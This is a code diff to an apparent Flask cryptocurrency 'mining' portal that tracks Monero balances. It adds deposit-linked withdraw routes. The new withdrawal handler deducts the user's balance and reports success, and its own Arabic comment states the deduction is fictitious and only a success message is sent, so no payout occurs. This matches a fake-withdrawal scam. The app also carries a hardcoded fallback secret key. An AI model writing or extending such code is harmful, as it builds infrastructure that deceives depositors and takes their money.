@@ -8,7 +8,7 @@ import uuid
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', "stealth_mining_key_xmr_2024")
 
-# إعداد قاعدة البيانات لملاءمة Vercel (ملاحظة: البيانات قد تفقد عند إعادة تشغيل السيرفر في Vercel)
+# إعداد قاعدة البيانات لملاءمة Vercel
 if os.environ.get('VERCEL'):
     db_path = '/tmp/mining_vault.sqlite'
 else:
@@ -86,8 +86,6 @@ def login():
 def node_control():
     if "miner_id" not in session: return redirect(url_for("login"))
     user = User.query.get(session["miner_id"])
-    
-    # حماية ضد بيانات Vercel المتطايرة: إذا لم يتم العثور على المستخدم، اخرج بهدوء
     if not user:
         session.pop("miner_id", None)
         return redirect(url_for("landing"))
@@ -105,7 +103,39 @@ def deposit():
     if "miner_id" not in session: return redirect(url_for("login"))
     user = User.query.get(session["miner_id"])
     if not user: return redirect(url_for("landing"))
-    return render_template("deposit.html")
+    return render_template("deposit.html", user=user)
+
+@app.route("/portal/withdraw")
+def withdraw():
+    if "miner_id" not in session: return redirect(url_for("login"))
+    user = User.query.get(session["miner_id"])
+    if not user: return redirect(url_for("landing"))
+    return render_template("withdraw.html", user=user)
+
+@app.route("/portal/x/withdraw/request", methods=["POST"])
+def withdraw_request():
+    if "miner_id" not in session: return redirect(url_for("login"))
+    user = User.query.get(session["miner_id"])
+    amount_usd = float(request.form.get("amount", 0))
+    
+    # تحقق من الحد الأدنى 2.50$
+    if amount_usd < 2.50:
+        flash("عذراً، الحد الأدنى للسحب هو 2.50$", "error")
+        return redirect(url_for("withdraw"))
+    
+    # تحقق من الرصيد (تحويل تقريبي: 1 XMR = 150$)
+    user_balance_usd = user.balance_xmr * 150
+    if amount_usd > user_balance_usd:
+        flash("رصيدك الحالي غير كافٍ لإتمام هذه العملية", "error")
+        return redirect(url_for("withdraw"))
+    
+    # إذا نجح: يتم خصم الرصيد وهمياً وإرسال رسالة نجاح
+    amount_xmr = amount_usd / 150
+    user.balance_xmr -= amount_xmr
+    db.session.commit()
+    
+    flash(f"تم تقديم طلب سحب بقيمة {amount_usd}$ بنجاح. سيتم المعالجة قريباً.", "success")
+    return redirect(url_for("withdraw"))
 
 @app.route("/api/v2/node/pulse", methods=["POST"])
 def pulse_sync():
